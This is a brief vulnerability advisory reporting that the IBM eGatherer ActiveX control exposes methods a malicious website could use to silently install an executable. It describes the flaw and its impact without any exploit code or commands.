It is reported that the IBM eGatherer ActiveX control contains dangerous methods that may result in a remote compromise of a system on which the ActiveX control is installed. These methods may be accessed by a malicious website and may result in the silent installation of a malicious executable.

A remote attacker may exploit this vulnerability in order to silently install a malicious executable on an affected system.
